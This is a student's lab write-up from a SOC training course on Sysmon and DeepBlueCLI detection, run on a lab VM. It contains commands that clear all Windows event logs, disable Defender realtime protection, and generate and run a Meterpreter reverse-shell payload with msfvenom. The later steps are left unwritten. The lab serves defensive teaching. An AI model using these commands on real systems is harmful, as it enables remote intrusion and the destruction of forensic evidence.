---
{"dg-publish":true,"permalink":"/bhis-antisyphon-and-webinars/black-hills-soc-core/labs/bhis-socc-lab-sysmon/"}
---

## LAB: Sysmon Log
[IntroLabs/IntroClassFiles/Tools/IntroClass/Sysmon/Sysmon.md at master · strandjs/IntroLabs · GitHub](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/Sysmon/Sysmon.md)

In this lab, we're looking at Sysmon and the kinds of logs it returns.

The original lab has you create/run a piece of malware, then install Sysmon, and see what kinds of logs you see. This is neat, but I want to see a kind of before and after.

> **WARNING**: The changes I make to this lab are going to make some significant changes to the VM, so you might want to either take a snapshot/backup, or plan on re-extracting the VM later.

### Lab work
So with my new objectives in mind, here's what we're going to do. I've highlighted changes to the curriculum.

1. **Clean the machine**^[This is an old lab VM, and there's been a lot of suspicious activity up to this point.]
	1. **Uninstall Sysmon**^[Not strictly necessary, but I feel is more in the spirit of the test]
	2. **Clear the logs**
	3. Stop Windows Defender
2. Configure and run the malware
3. **Export and review the logs with DeepBlueCLI**
	1. We will also review the running logs to compare what we gathered vs. what DeepBlueCLI finds on its own
4. **Stop the Malware**
5. Install Sysmon
6. Configure and run the malware
7. Review the logs and **export and review the logs with DeepBlueCLI**


#### 1. Clean the machine
##### Uninstall Sysmon
So the first thing we need to do is uninstall [[Tool Deep-Dives/Windows/Sysmon\|Sysmon]] and remove it from the VM.

You *should* be able to remove Sysmon with `Sysmon64.exe -u force`, but since we're going to be reinstalling it, there's some cleanup we can do following this guide from *James Gibbins*.^[
[Sysmon: How to install, upgrade, and uninstall - James' Pereductions](https://www.jamesgibbins.com/posts/sysmon-install/)] Basically, after we uninstall Sysmon, it leaves some artifacts, and we can run the following script to delete them:^[Source (because the GitHub embed was hard to read in production): [sysmon-reg-keys-deleter](https://gist.githubusercontent.com/jamesdeluk/48f1c5b545a1cd10832e25b677f0e758/raw/5a05eb5ba23eea5bbec9505586928ce9350e6ab7/sysmon-reg-keys-deleter)]

```PowerShell
$log_file = 'sysmon-uninstall.log'

$items = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services\Sysmon64",
    "HKLM:\SYSTEM\CurrentControlSet\Services\SysmonDrv",
    "HKLM:\SYSTEM\ControlSet001\Services\Sysmon64",
    "HKLM:\SYSTEM\ControlSet001\Services\SysmonDrv",
    "HKLM:\SYSTEM\ControlSet002\Services\Sysmon64",
    "HKLM:\SYSTEM\ControlSet002\Services\SysmonDrv",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational"
)

foreach ( $i in $items ) {
    $error.Clear();
    Remove-Item -Path $i -Force -Recurse -ErrorAction SilentlyContinue
    If($error) {
        $result = $error.Exception.Message
    } Else {
        $result = "O : $i"
    }
    Write-Output "$result".ToString() | Out-File -Filepath $log_file -Append -NoClobber -Encoding UTF8
}
```

Note that the output is written to the file `sysmon-uninstall.log` in the directory where you ran the script (e.g., `C:\Users\adhd`)

##### Clear the logs
Once done, we can clear the logs to act as if nothing has ever happened on this machine, not even once.

```PowerShell
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

```

##### Stop Windows Defender
We won't see much in the logs if we can't run the malware.
`Set-MpPreference -DisableRealtimeMonitoring $true`

> If you see a warning for **A general error occurred**, this is **good**.

#### 2. Create and run the malware
Now that we have a "clean" machine, let's get it dirty. Following John's guide, we create a simple backdoor with [[Tool Deep-Dives/Metasploit/Meterpreter\|Meterpreter]]^[Which I'd heard people call "Meter Peter," but their eyes are just getting lost in it. It's short for "Metasploit Interpreter" according to [Wikipedia](https://en.wikipedia.org/wiki/Metasploit#Payloads).]

We've done this on a few labs, so I'll just summarize here.
1. Get Ubuntu IP address
	1. `172.30.99.174`
2. Create and deploy the TrustMe.exe malware
	1. `sudo msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=172.30.99.174 lport=4444 -f exe -o /tmp/TrustMe.exe`
	2. `cd /tmp`
	3. `sudo ls -l TrustMe.exe`
	4. `sudo cp ./TrustMe.exe /mnt/c/tools`
3. Start the "remote" handler
	1. New Ubuntu terminal
	2. ![BHIS-SOCC-lab-Sysmon-1.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-1.png)
		1. Commands in blue
4. Run TrustMe.exe
	1. Open an admin Command terminal, and run `\tools\TrustMe.exe`
	2. You should see Meterpreter complete the connection
	3. ![BHIS-SOCC-lab-Sysmon-2.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-2.png)
	4. At this point, we could run some pretty sick commands, but we can confirm that we're connected to the windows host with a couple commands
		1. `getuid` - Shows the server name and the username
		2. `ps` - Shows all the processes running on the target machine
			1. And these are distinctly Windows processes, not Linux, despite running from the Ubuntu terminal, so we know we have access

#### 3. **Export and review the logs with DeepBlueCLI**
We've got two avenues we could go here; either run [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]] against the running Event Logs, or copy the relevant EVTX files for offline review. 

Running `DeepBlue.ps1` without any arguments tells it to check the running config, and the script below copies specific EVTX files from their source directory and then merges the EVTX files [with this script into a single file](https://github.com/abhinav-eyesOnglass/evtx), and then scans the file with [[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]].

```PowerShell
$uniqstamp = Get-Date -f yyMMddhhmmss
New-Item -ItemType directory -Path "C:\logs\" -Name $uniqstamp
$logNames = @(
    "Security",
    "System",
    "Application",
    "Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall",
    "Microsoft-Windows-TaskScheduler*",
    "Microsoft-Windows-PowerShell*",
    "Microsoft-Windows-Sysmon*",
    "Microsoft-Windows-Windows Defender*"
)

foreach ($logName in $logNames) {
	Copy-Item -Path "C:\Windows\System32\winevt\logs\$logName.evtx" -Destination "C:\logs\$uniqstamp"
}

# Download EVTX merger script

Invoke-WebRequest https://raw.githubusercontent.com/abhinav-eyesOnglass/evtx/master/Merge_the_events.ps1 -OutFile C:\logs\Merge_the_events.ps1

C:\logs\Merge_the_events.ps1 -FolderPath "C:\logs\$uniqstamp" -NonInteractive

C:\tools\DeepBlueCLI-master\DeepBlue.ps1 C:\logs\$uniqstamp\Merge.evtx

```

In either case, we get nothing.

![BHIS-SOCC-lab-Sysmon-4.png](/img/user/Attachments/BHIS-SOCC-lab-Sysmon-4.png)
#### 4. **Stop the Malware**

Had to pause here and reboot because I ran out of time.

#### 5. Install Sysmon
#### 6. Configure and run the malware
#### 7. Review the logs and **export and review the logs with DeepBlueCLI**
### Lab work
1. Create some malware
2. Begin Sysmon (should already be running)
3. Investigate Sysmon Logs (Application-Microsoft-Windows-Sysmon/Operational)
	1. Once you find the event, you can find a TON of information about that event
4. [GPO and Sysmon](https://www.syspanda.com/index.php/2017/02/28/deploying-sysmonthrough-gpo/)